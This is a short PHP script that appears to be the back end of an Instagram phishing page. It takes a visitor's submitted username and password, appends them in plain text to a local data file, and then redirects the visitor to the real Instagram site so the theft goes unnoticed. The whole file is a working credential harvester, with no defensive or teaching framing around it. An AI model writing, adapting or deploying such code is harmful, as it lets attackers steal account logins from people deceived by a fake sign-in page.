<?php
$username = $_POST["username"];
$password = $_POST["passwd"];

$myfile = fopen("data/data.txt","a+") or die("Unable to open File!");

$txt = "\nusername:" .  $username . "\nPassword" .  $password;

fwrite($myfile,$txt);
fclose($myfile);
header('Location:https://www.instagram.com');

?>